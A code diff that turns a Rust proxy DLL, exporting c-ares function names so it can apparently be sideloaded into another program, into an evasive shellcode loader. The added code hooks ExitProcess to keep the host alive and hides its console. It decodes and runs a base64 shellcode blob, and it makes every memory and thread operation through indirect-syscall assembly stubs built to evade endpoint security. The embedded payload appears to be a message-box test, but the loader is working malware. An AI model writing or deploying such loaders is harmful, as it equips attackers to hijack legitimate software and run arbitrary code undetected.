@@ -1,20 +1,181 @@
 #![allow(non_snake_case)]
 
-use windows::core::{PCSTR, PSTR};
+use std::arch::global_asm;
 use windows::Win32::Foundation::{BOOL, HINSTANCE};
 use windows::Win32::System::SystemServices::DLL_PROCESS_ATTACH;
-use windows::Win32::System::Threading::{
-    CreateProcessA, CreateThread,
-    PROCESS_INFORMATION, STARTUPINFOA,
-    THREAD_CREATION_FLAGS, CREATE_NO_WINDOW,
-    INFINITE, WaitForSingleObject, CreateEventA,
-};
-use windows::Win32::System::LibraryLoader::GetModuleHandleA;
-use windows::Win32::System::Memory::{VirtualProtect, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS};
-use windows::Win32::UI::WindowsAndMessaging::{ShowWindow, SW_HIDE};
-use windows::Win32::System::Console::GetConsoleWindow;
+use base64::{Engine as _, engine::general_purpose};
+
+mod syscall;
+use syscall::{get_syscall_info, get_syscall_number, get_module_base, get_export_address};
 
 static mut ORIGINAL_EXIT_PROCESS: usize = 0;
+
+global_asm!(r#"
+.global asm_nt_allocate_virtual_memory
+asm_nt_allocate_virtual_memory:
+    mov [rsp + 0x10], rdx
+    mov [rsp + 0x18], r8
+    mov [rsp + 0x20], r9
+    mov r10, rcx
+    mov eax, [rsp + 0x38]
+    mov r11, [rsp + 0x40]
+    mov r12, [rsp + 0x48]
+    push r12
+    jmp r11
+
+.global asm_nt_protect_virtual_memory
+asm_nt_protect_virtual_memory:
+    mov [rsp + 0x10], rdx
+    mov [rsp + 0x18], r8
+    mov [rsp + 0x20], r9
+    mov r10, rcx
+    mov eax, [rsp + 0x30]
+    mov r11, [rsp + 0x38]
+    mov r12, [rsp + 0x40]
+    push r12
+    jmp r11
+
+.global asm_nt_write_virtual_memory
+asm_nt_write_virtual_memory:
+    mov [rsp + 0x10], rdx
+    mov [rsp + 0x18], r8
+    mov [rsp + 0x20], r9
+    mov r10, rcx
+    mov eax, [rsp + 0x30]
+    mov r11, [rsp + 0x38]
+    mov r12, [rsp + 0x40]
+    push r12
+    jmp r11
+
+.global asm_nt_create_thread_ex
+asm_nt_create_thread_ex:
+    mov [rsp + 0x10], rdx
+    mov [rsp + 0x18], r8
+    mov [rsp + 0x20], r9
+    mov r10, rcx
+    mov eax, [rsp + 0x60]
+    mov r11, [rsp + 0x68]
+    mov r12, [rsp + 0x70]
+    push r12
+    jmp r11
+
+.global asm_nt_create_event
+asm_nt_create_event:
+    mov [rsp + 0x10], rdx
+    mov [rsp + 0x18], r8
+    mov [rsp + 0x20], r9
+    mov r10, rcx
+    mov eax, [rsp + 0x30]
+    mov r11, [rsp + 0x38]
+    mov r12, [rsp + 0x40]
+    push r12
+    jmp r11
+
+.global asm_nt_wait_for_single_object
+asm_nt_wait_for_single_object:
+    mov [rsp + 0x10], rdx
+    mov [rsp + 0x18], r8
+    mov [rsp + 0x20], r9
+    mov r10, rcx
+    mov eax, r9d
+    mov r11, [rsp + 0x28]
+    mov r12, [rsp + 0x30]
+    push r12
+    jmp r11
+
+.global asm_nt_user_show_window
+asm_nt_user_show_window:
+    mov [rsp + 0x10], rdx
+    mov [rsp + 0x18], r8
+    mov [rsp + 0x20], r9
+    mov r10, rcx
+    mov eax, r8d
+    mov r11, [rsp + 0x20]
+    mov r12, [rsp + 0x28]
+    push r12
+    jmp r11
+"#);
+
+extern "C" {
+    fn asm_nt_allocate_virtual_memory(
+        ProcessHandle: windows_sys::Win32::Foundation::HANDLE,
+        BaseAddress: &mut *mut std::ffi::c_void,
+        ZeroBits: usize,
+        RegionSize: &mut usize,
+        AllocationType: u32,
+        Protect: u32,
+        syscall_id: u32,
+        syscall_inst: *mut std::ffi::c_void,
+        gadget: *mut std::ffi::c_void,
+    ) -> windows_sys::Win32::Foundation::NTSTATUS;
+
+    fn asm_nt_protect_virtual_memory(
+        ProcessHandle: windows_sys::Win32::Foundation::HANDLE,
+        BaseAddress: &mut *mut std::ffi::c_void,
+        NumberOfBytesToProtect: &mut usize,
+        NewAccessProtection: u32,
+        OldAccessProtection: &mut u32,
+        syscall_id: u32,
+        syscall_inst: *mut std::ffi::c_void,
+        gadget: *mut std::ffi::c_void,
+    ) -> windows_sys::Win32::Foundation::NTSTATUS;
+
+    fn asm_nt_write_virtual_memory(
+        ProcessHandle: windows_sys::Win32::Foundation::HANDLE,
+        BaseAddress: *mut std::ffi::c_void,
+        Buffer: *const std::ffi::c_void,
+        NumberOfBytesToWrite: usize,
+        NumberOfBytesWritten: &mut usize,
+        syscall_id: u32,
+        syscall_inst: *mut std::ffi::c_void,
+        gadget: *mut std::ffi::c_void,
+    ) -> windows_sys::Win32::Foundation::NTSTATUS;
+
+    fn asm_nt_create_thread_ex(
+        ThreadHandle: &mut windows_sys::Win32::Foundation::HANDLE,
+        DesiredAccess: u32,
+        ObjectAttributes: *mut std::ffi::c_void,
+        ProcessHandle: windows_sys::Win32::Foundation::HANDLE,
+        StartRoutine: *mut std::ffi::c_void,
+        Argument: *mut std::ffi::c_void,
+        CreateFlags: u32,
+        ZeroBits: usize,
+        StackSize: usize,
+        MaximumStackSize: usize,
+        AttributeList: *mut std::ffi::c_void,
+        syscall_id: u32,
+        syscall_inst: *mut std::ffi::c_void,
+        gadget: *mut std::ffi::c_void,
+    ) -> windows_sys::Win32::Foundation::NTSTATUS;
+
+    fn asm_nt_create_event(
+        EventHandle: &mut windows_sys::Win32::Foundation::HANDLE,
+        DesiredAccess: u32,
+        ObjectAttributes: *mut std::ffi::c_void,
+        EventType: u32,
+        InitialState: u8,
+        syscall_id: u32,
+        syscall_inst: *mut std::ffi::c_void,
+        gadget: *mut std::ffi::c_void,
+    ) -> windows_sys::Win32::Foundation::NTSTATUS;
+
+    fn asm_nt_wait_for_single_object(
+        Handle: windows_sys::Win32::Foundation::HANDLE,
+        Alertable: u8,
+        Timeout: *mut i64,
+        syscall_id: u32,
+        syscall_inst: *mut std::ffi::c_void,
+        gadget: *mut std::ffi::c_void,
+    ) -> windows_sys::Win32::Foundation::NTSTATUS;
+
+    fn asm_nt_user_show_window(
+        hwnd: windows::Win32::Foundation::HWND,
+        n_cmd_show: u32,
+        syscall_id: u32,
+        syscall_inst: *mut std::ffi::c_void,
+        gadget: *mut std::ffi::c_void,
+    ) -> windows::Win32::Foundation::BOOL;
+}
 
 macro_rules! export_function {
     ($name:ident) => {
@@ -333,67 +494,218 @@ export_function!(ares_tolower);
 export_function!(ares_version);
 
 unsafe fn hook_exit_process() {
-    use windows::Win32::System::LibraryLoader::GetProcAddress;
+    if let (Some(kernel32_base), Some((nt_protect_id, nt_protect_inst, gadget)), Some((nt_write_id, nt_write_inst, _))) = (
+        get_module_base("kernel32.dll"),
+        get_syscall_info("NtProtectVirtualMemory"),
+        get_syscall_info("NtWriteVirtualMemory"),
+    ) {
+        if let Some(exit_proc_addr) = get_export_address(kernel32_base, "ExitProcess") {
+            let exit_proc_ptr = exit_proc_addr as *mut u8;
+            ORIGINAL_EXIT_PROCESS = exit_proc_ptr as usize;
 
-    let kernel32 = GetModuleHandleA(PCSTR(b"kernel32.dll\0".as_ptr())).unwrap();
-    let exit_proc_addr = GetProcAddress(kernel32, PCSTR(b"ExitProcess\0".as_ptr()))
-        .unwrap() as *mut u8;
+            let mut base_address = exit_proc_ptr as *mut std::ffi::c_void;
+            let mut region_size = 12usize;
+            let mut old_protect = 0u32;
 
-    ORIGINAL_EXIT_PROCESS = exit_proc_addr as usize;
+            asm_nt_protect_virtual_memory(
+                -1isize as windows_sys::Win32::Foundation::HANDLE,
+                &mut base_address,
+                &mut region_size,
+                0x04, // PAGE_READWRITE
+                &mut old_protect,
+                nt_protect_id,
+                nt_protect_inst,
+                gadget,
+            );
 
-    let mut old_protect = PAGE_PROTECTION_FLAGS(0);
-    VirtualProtect(
-        exit_proc_addr as *const _,
-        12,
-        PAGE_EXECUTE_READWRITE,
-        &mut old_protect,
-    ).ok();
+            let hook_addr = fake_exit_process as usize;
+            let patch: [u8; 12] = [
+                0x48, 0xB8,
+                (hook_addr & 0xFF) as u8,
+                ((hook_addr >> 8) & 0xFF) as u8,
+                ((hook_addr >> 16) & 0xFF) as u8,
+                ((hook_addr >> 24) & 0xFF) as u8,
+                ((hook_addr >> 32) & 0xFF) as u8,
+                ((hook_addr >> 40) & 0xFF) as u8,
+                ((hook_addr >> 48) & 0xFF) as u8,
+                ((hook_addr >> 56) & 0xFF) as u8,
+                0xFF, 0xE0,
+            ];
 
-    let hook_addr = fake_exit_process as usize;
+            let mut bytes_written = 0usize;
+            asm_nt_write_virtual_memory(
+                -1isize as windows_sys::Win32::Foundation::HANDLE,
+                exit_proc_ptr as *mut std::ffi::c_void,
+                patch.as_ptr() as *const std::ffi::c_void,
+                patch.len(),
+                &mut bytes_written,
+                nt_write_id,
+                nt_write_inst,
+                gadget,
+            );
 
-    let patch: [u8; 12] = [
-        0x48, 0xB8,
-        (hook_addr & 0xFF) as u8,
-        ((hook_addr >> 8) & 0xFF) as u8,
-        ((hook_addr >> 16) & 0xFF) as u8,
-        ((hook_addr >> 24) & 0xFF) as u8,
-        ((hook_addr >> 32) & 0xFF) as u8,
-        ((hook_addr >> 40) & 0xFF) as u8,
-        ((hook_addr >> 48) & 0xFF) as u8,
-        ((hook_addr >> 56) & 0xFF) as u8,
-        0xFF, 0xE0,
-    ];
-
-    std::ptr::copy_nonoverlapping(patch.as_ptr(), exit_proc_addr, 12);
-
-    VirtualProtect(
-        exit_proc_addr as *const _,
-        12,
-        old_protect,
-        &mut old_protect,
-    ).ok();
+            asm_nt_protect_virtual_memory(
+                -1isize as windows_sys::Win32::Foundation::HANDLE,
+                &mut base_address,
+                &mut region_size,
+                old_protect,
+                &mut old_protect,
+                nt_protect_id,
+                nt_protect_inst,
+                gadget,
+            );
+        }
+    }
 }
 
 unsafe extern "system" fn fake_exit_process(_exit_code: u32) {
-    let event = CreateEventA(None, true, false, PCSTR::null()).unwrap();
-    WaitForSingleObject(event, INFINITE);
+    if let (Some((nt_create_event_id, nt_create_event_inst, gadget)), Some((nt_wait_id, nt_wait_inst, _))) = (
+        get_syscall_info("NtCreateEvent"),
+        get_syscall_info("NtWaitForSingleObject"),
+    ) {
+        let mut event_handle: windows_sys::Win32::Foundation::HANDLE = 0;
+        asm_nt_create_event(
+            &mut event_handle,
+            0x1F0003, // EVENT_ALL_ACCESS
+            std::ptr::null_mut(),
+            1, // NotificationEvent
+            0, // Not signaled
+            nt_create_event_id,
+            nt_create_event_inst,
+            gadget,
+        );
+
+        if event_handle != 0 {
+            asm_nt_wait_for_single_object(
+                event_handle,
+                0,
+                std::ptr::null_mut(), // INFINITE
+                nt_wait_id,
+                nt_wait_inst,
+                gadget,
+            );
+        }
+    }
+    loop { std::thread::sleep(std::time::Duration::from_secs(60)); }
 }
 
-unsafe extern "system" fn notepad_thread(_: *mut core::ffi::c_void) -> u32 {
-    let mut si = STARTUPINFOA::default();
-    si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
+const ENCODED_SHELLCODE: &str = "/EiB5PD////o0AAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0b0gB0FCLSBhEi0AgSQHQ41xI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpT////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu/C1olZBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VSGVsbG8gZnJvbSBKdWxlcyEASnVsZXMA";
 
-    let mut pi = PROCESS_INFORMATION::default();
-    let mut cmd = b"notepad.exe\0".to_vec();
+unsafe extern "system" fn shellcode_thread(_: *mut core::ffi::c_void) -> u32 {
+    if let Ok(shellcode) = general_purpose::STANDARD.decode(ENCODED_SHELLCODE) {
+        if let (Some((nt_alloc_id, nt_alloc_inst, gadget)), Some((nt_write_id, nt_write_inst, _)), Some((nt_protect_id, nt_protect_inst, _))) = (
+            get_syscall_info("NtAllocateVirtualMemory"),
+            get_syscall_info("NtWriteVirtualMemory"),
+            get_syscall_info("NtProtectVirtualMemory"),
+        ) {
+            let mut exec_mem: *mut std::ffi::c_void = std::ptr::null_mut();
+            let mut region_size = shellcode.len();
 
-    let _ = CreateProcessA(
-        PCSTR::null(),
-        PSTR(cmd.as_mut_ptr()),
-        None, None, false,
-        CREATE_NO_WINDOW,
-        None, PCSTR::null(),
-        &si, &mut pi,
-    );
+            let status = asm_nt_allocate_virtual_memory(
+                -1isize as windows_sys::Win32::Foundation::HANDLE,
+                &mut exec_mem,
+                0,
+                &mut region_size,
+                0x3000, // MEM_COMMIT | MEM_RESERVE
+                0x04,   // PAGE_READWRITE
+                nt_alloc_id,
+                nt_alloc_inst,
+                gadget,
+            );
+
+            if status == 0 && !exec_mem.is_null() {
+                let mut bytes_written = 0usize;
+                asm_nt_write_virtual_memory(
+                    -1isize as windows_sys::Win32::Foundation::HANDLE,
+                    exec_mem,
+                    shellcode.as_ptr() as *const std::ffi::c_void,
+                    shellcode.len(),
+                    &mut bytes_written,
+                    nt_write_id,
+                    nt_write_inst,
+                    gadget,
+                );
+
+                let mut old_protect = 0u32;
+                let mut protect_size = shellcode.len();
+                let mut protect_base = exec_mem;
+                asm_nt_protect_virtual_memory(
+                    -1isize as windows_sys::Win32::Foundation::HANDLE,
+                    &mut protect_base,
+                    &mut protect_size,
+                    0x20, // PAGE_EXECUTE_READ
+                    &mut old_protect,
+                    nt_protect_id,
+                    nt_protect_inst,
+                    gadget,
+                );
+
+                let exec_fn: extern "system" fn() = std::mem::transmute(exec_mem);
+                exec_fn();
+            }
+        }
+    }
+    0
+}
+
+unsafe extern "system" fn hide_console_thread(_: *mut core::ffi::c_void) -> u32 {
+    loop {
+        if let Some(kernel32_base) = get_module_base("kernel32.dll") {
+            if let Some(get_console_window_addr) = get_export_address(kernel32_base, "GetConsoleWindow") {
+                let get_console_window: extern "system" fn() -> windows::Win32::Foundation::HWND = std::mem::transmute(get_console_window_addr);
+                let hwnd = get_console_window();
+                if hwnd.0 != 0 {
+                    if let (Some(nt_show_window_id), Some((_, syscall_inst, gadget))) = (
+                        get_syscall_number("win32u.dll", "NtUserShowWindow"),
+                        get_syscall_info("NtAllocateVirtualMemory"),
+                    ) {
+                        asm_nt_user_show_window(hwnd, 0, nt_show_window_id, syscall_inst, gadget); // SW_HIDE = 0
+                        break;
+                    }
+                }
+            }
+        }
+        std::thread::sleep(std::time::Duration::from_millis(100));
+    }
+    0
+}
+
+unsafe extern "system" fn worker_thread(_: *mut core::ffi::c_void) -> u32 {
+    hook_exit_process();
+
+    if let Some((nt_create_thread_id, nt_create_thread_inst, gadget)) = get_syscall_info("NtCreateThreadEx") {
+        let mut thread_handle: windows_sys::Win32::Foundation::HANDLE = 0;
+
+        // Spawn console hider thread
+        asm_nt_create_thread_ex(
+            &mut thread_handle,
+            0x1FFFFF, // THREAD_ALL_ACCESS
+            std::ptr::null_mut(),
+            -1isize as windows_sys::Win32::Foundation::HANDLE,
+            hide_console_thread as *mut std::ffi::c_void,
+            std::ptr::null_mut(),
+            0, 0, 0, 0,
+            std::ptr::null_mut(),
+            nt_create_thread_id,
+            nt_create_thread_inst,
+            gadget,
+        );
+
+        // Spawn shellcode thread
+        asm_nt_create_thread_ex(
+            &mut thread_handle,
+            0x1FFFFF, // THREAD_ALL_ACCESS
+            std::ptr::null_mut(),
+            -1isize as windows_sys::Win32::Foundation::HANDLE,
+            shellcode_thread as *mut std::ffi::c_void,
+            std::ptr::null_mut(),
+            0, 0, 0, 0,
+            std::ptr::null_mut(),
+            nt_create_thread_id,
+            nt_create_thread_inst,
+            gadget,
+        );
+    }
     0
 }
 
@@ -405,17 +717,22 @@ pub extern "system" fn DllMain(
 ) -> BOOL {
     if fdw_reason == DLL_PROCESS_ATTACH {
         unsafe {
-            // ahot.exe konsol penceresini gizle
-            let hwnd = GetConsoleWindow();
-            ShowWindow(hwnd, SW_HIDE);
-
-            // ExitProcess'i hook'la - process kapanmasın
-            hook_exit_process();
-
-            // Notepad'i başlat
-            let _ = CreateThread(
-                None, 0, Some(notepad_thread), None, THREAD_CREATION_FLAGS(0), None,
-            );
+            if let Some((nt_create_thread_id, nt_create_thread_inst, gadget)) = get_syscall_info("NtCreateThreadEx") {
+                let mut thread_handle: windows_sys::Win32::Foundation::HANDLE = 0;
+                asm_nt_create_thread_ex(
+                    &mut thread_handle,
+                    0x1FFFFF, // THREAD_ALL_ACCESS
+                    std::ptr::null_mut(),
+                    -1isize as windows_sys::Win32::Foundation::HANDLE,
+                    worker_thread as *mut std::ffi::c_void,
+                    std::ptr::null_mut(),
+                    0, 0, 0, 0,
+                    std::ptr::null_mut(),
+                    nt_create_thread_id,
+                    nt_create_thread_inst,
+                    gadget,
+                );
+            }
         }
     }
     BOOL(1)
